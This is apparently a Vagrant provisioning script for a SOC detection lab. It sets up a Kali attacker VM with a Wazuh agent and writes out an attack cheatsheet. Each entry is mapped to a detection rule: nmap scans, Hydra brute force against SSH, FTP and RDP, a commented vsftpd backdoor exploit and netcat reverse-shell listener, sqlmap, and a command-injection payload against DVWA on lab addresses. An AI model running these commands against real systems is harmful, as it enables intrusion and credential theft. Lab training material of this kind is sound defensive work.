#!/usr/bin/env bash
# =============================================================================
# provision-kali.sh — Kali Linux Attacker provisioner
# Runs on: kali-attacker VM (192.168.172.200)
# =============================================================================
set -euo pipefail

WAZUH_IP="192.168.172.140"
AGENT_NAME="kali-attacker"
AGENT_GROUP="linux-agents"

log() { echo "[KALI-PROVISION] $*"; }

# ---------------------------------------------------------------------------
# 1. System prep
# ---------------------------------------------------------------------------
log "Updating Kali..."
export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get upgrade -y
hostnamectl set-hostname kali-attacker

apt-get install -y curl wget net-tools nmap hydra nikto sqlmap \
  metasploit-framework netcat-traditional john gobuster \
  python3 python3-pip sshpass

# ---------------------------------------------------------------------------
# 2. Wazuh agent install
# ---------------------------------------------------------------------------
log "Installing Wazuh agent..."
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --dearmor \
  -o /usr/share/keyrings/wazuh.gpg

echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] \
  https://packages.wazuh.com/4.x/apt/ stable main" \
  > /etc/apt/sources.list.d/wazuh.list

apt-get update -y

WAZUH_MANAGER="${WAZUH_IP}" \
WAZUH_AGENT_GROUP="${AGENT_GROUP}" \
WAZUH_AGENT_NAME="${AGENT_NAME}" \
apt-get install -y wazuh-agent

systemctl daemon-reload
systemctl enable wazuh-agent
systemctl start wazuh-agent

sleep 5
if systemctl is-active --quiet wazuh-agent; then
  log "  ✓ Wazuh agent running"
else
  log "  ✗ Wazuh agent failed — check: journalctl -u wazuh-agent"
fi

# ---------------------------------------------------------------------------
# 3. Drop attack cheatsheet for lab use
# ---------------------------------------------------------------------------
cat > /home/vagrant/lab-attacks.sh <<'EOF'
#!/usr/bin/env bash
# =============================================================================
# SOC Lab — Attack Cheatsheet
# Run these from kali-attacker (192.168.172.200)
# =============================================================================

TARGET_META="192.168.172.150"   # Metasploitable3
TARGET_WIN="192.168.172.160"    # Windows 11
WAZUH_IP="192.168.172.140"

# --- PHASE 1: Reconnaissance ---
# Nmap SYN scan (triggers rule 9000001)
nmap -sS "$TARGET_META"

# Aggressive scan (triggers 9000004)
nmap -A "$TARGET_META"

# ICMP sweep (triggers 9000002)
nmap -sn 192.168.172.0/24

# Nikto web scan (triggers 9000030 / rule 100010)
nikto -h "http://$TARGET_META"

# --- PHASE 2: Brute Force ---
# SSH brute force with Hydra (triggers 9000010 / rule 100002)
hydra -l vagrant -P /usr/share/wordlists/rockyou.txt \
  "$TARGET_META" ssh -t 4 -I

# FTP brute force (triggers 9000020)
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt \
  "$TARGET_META" ftp

# RDP brute force (triggers 9000050)
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt \
  "$TARGET_WIN" rdp

# --- PHASE 3: Exploitation ---
# vsftpd 2.3.4 backdoor via Metasploit (triggers 9000040 / 9000041)
# msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; \
#   set RHOSTS $TARGET_META; run"

# Reverse shell listener — run on Kali, trigger from target
# nc -lvnp 4444

# --- PHASE 4: Web Attacks (DVWA on Metasploitable) ---
# SQLMap (triggers 9000031 / rule 100021)
sqlmap -u "http://$TARGET_META/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=abc123" --batch

# Command injection via curl (triggers rule 100020)
curl "http://$TARGET_META/dvwa/vulnerabilities/exec/" \
  --data "ip=127.0.0.1%3Bid&Submit=Submit" \
  --cookie "security=low; PHPSESSID=abc123"

EOF
chmod +x /home/vagrant/lab-attacks.sh
chown vagrant:vagrant /home/vagrant/lab-attacks.sh

log "Attack cheatsheet saved to /home/vagrant/lab-attacks.sh"
log "Kali provisioning complete."
